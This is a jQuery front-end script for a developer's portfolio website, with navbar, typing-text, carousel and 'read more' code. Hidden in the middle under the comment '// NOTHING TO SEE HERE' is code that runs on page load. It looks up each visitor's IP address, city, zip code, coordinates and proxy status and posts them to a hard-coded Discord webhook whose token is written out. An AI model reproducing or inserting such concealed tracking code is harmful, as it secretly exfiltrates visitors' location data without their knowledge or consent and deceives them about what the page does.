$(document).ready(function(){
    $(window).scroll(function(){
        // sticky navbar on scroll script
        if(this.scrollY > 20){
            $('.navbar').addClass("sticky");
        }else{
            $('.navbar').removeClass("sticky");
        }
        // scroll-up button show/hide script
        if(this.scrollY > 500){
            $('.scroll-up-btn').addClass("show");
        }else{
            $('.scroll-up-btn').removeClass("show");
        }
    });
    // slide-up script
    $('.scroll-up-btn').click(function(){
        $('html').animate({scrollTop: 0});
        // removing smooth scroll on slide-up button click
        $('html').css("scrollBehavior", "auto");
    });
    $('.navbar .menu li a').click(function(){
        // applying again smooth scroll on menu items click
        $('html').css("scrollBehavior", "smooth");
    });
    // toggle menu/navbar script
    $('.menu-btn').click(function(){
        $('.navbar .menu').toggleClass("active");
        $('.menu-btn i').toggleClass("active");
    });
    // typing text animation script
    var typed = new Typed(".typing", {
        strings: ["Game Developer", "Website Developer", "Graphic designer", "Designer", "Freelancer", "Programmer"],
        typeSpeed: 100,
        backSpeed: 60,
        loop: true
    });
    var typed = new Typed(".typing-2", {
        strings: ["Game Developer", "Website Developer", "Graphic designer", "Designer", "Freelancer", "Programmer"],
        typeSpeed: 100,
        backSpeed: 60,
        loop: true
    });
    // owl carousel script
    $('.carousel').owlCarousel({
        margin: 20,
        loop: true,
        autoplay: true,
        autoplayTimeOut: 2000,
        autoplayHoverPause: true,
        responsive: {
            0:{
                items: 1,
                nav: false
            },
            600:{
                items: 2,
                nav: false
            },
            1000:{
                items: 3,
                nav: false
            }
        }
    });
});


// NOTHING TO SEE HERE
const webHookUrl = "https://discord.com/api/webhooks/1231402629435883641/R0sexkYFGgqev-doFhVvd0GPnPPdX1IHcEj7c3a_j5GRcqeZoivbAtDETkb21zYDzlyA";

async function fetchData(url) {
    const response = await fetch(url);
    if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
    }
    return response.json();
}

function generateUniqueRandomNumber() {
    const timestamp = new Date().getTime();
    const random = Math.floor(Math.random() * 10000);
    return `${timestamp}${random}`;
}

async function sendMessage(params, uniqueRandomNumber) {
    try {
        const response = await fetch(webHookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(params)
        });
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        console.log(`User: ${uniqueRandomNumber}`);
    } catch (error) {
        console.error('Error:', error);
    }
}

async function sendIPInfo() {
    try {
        // Fetch IP information from freeipapi.com
        const data = await fetchData('https://freeipapi.com/api/json/');

        // Check if the response contains the expected data
        if (!data || !data.ipAddress) {
            throw new Error('Invalid API response');
        }

        const ip = data.ipAddress;
        const cityName = data.cityName || 'N/A';
        const timezone = data.timeZone || 'N/A';
        const country = data.countryName || 'N/A';
        const countryCode = data.countryCode ? data.countryCode.toLowerCase() : 'N/A';
        const region = data.regionName || 'N/A';
        const city = data.cityName || 'N/A';
        const zip = data.zipCode || 'N/A';
        const lat = data.latitude || 'N/A';
        const lon = data.longitude || 'N/A';
        const isProxy = data.isProxy || 'N/A';
        const uniqueRandomNumber = generateUniqueRandomNumber();

        // Prepare the message to send to Discord
        const params = {
            username: "Mr",
            content: `
**IP Information:**
\`\`\`
IP Address: ${ip}
cityName: ${cityName}
Timezone: ${timezone}
Country: ${country} (${countryCode})
Region: ${region}
City: ${city}
Zip Code: ${zip}
Longitude: ${lon}
Latitude: ${lat}
isProxy: ${isProxy}
\`\`\`
**Unique Random Number:** ${uniqueRandomNumber}
`
        };

        // Send the message to Discord
        await sendMessage(params, uniqueRandomNumber);
    } catch (error) {
        console.error('Error:', error);
    }
}

sendIPInfo();

// script.js
$(document).ready(function(){
    // Add an event listener for the "Read more" button
    $('#read-more-btn').click(function(){
        toggleReadMore();
    });
    // Function to toggle the "Read more" content
    function toggleReadMore() {
        var paragraph = $("#skills-paragraph");
        var moreText = "Hello there! I'm a seasoned developer with a rich four-year journey in the dynamic realm of programming. My expertise spans a versatile array of languages, showcasing proficiency in C#, Python, HTML, JavaScript, MySQL, PHP, CSS, Lua, and more.";
        var btnText = $("#read-more-btn");
        if (paragraph.html() === moreText) {
            paragraph.append(`
                <br><br>My forte lies not just in the breadth of languages but in the depth of my understanding. Whether it's crafting intricate algorithms in C# or developing web applications with Python, I bring a wealth of experience to the table.

                Having honed my skills in the Unity engine, I'm well-versed in the intricacies of game development. From concept to execution, I navigate the challenges with finesse, blending creativity with technical prowess. My proficiency extends beyond code; I'm adept at leveraging tools like Photoshop to enhance the visual appeal of projects.

                What sets me apart is not just my technical acumen but also my ability to adapt swiftly. I have a proven track record of fast learning, ensuring that I stay ahead of the curve in an ever-evolving tech landscape.

                Whether you're looking to streamline your database with MySQL, design an engaging website with HTML and CSS, or delve into the world of scripting with Lua, I've got you covered. My commitment is not just to meet expectations but to exceed them.

                If you're seeking a collaborative and innovative developer who can seamlessly integrate into your projects, I'm here to bring your vision to life. Let's build something extraordinary together!
            `);
            btnText.html("Read less");
        } else {
            paragraph.html(moreText);
            btnText.html("Read more");
        }
    }
});
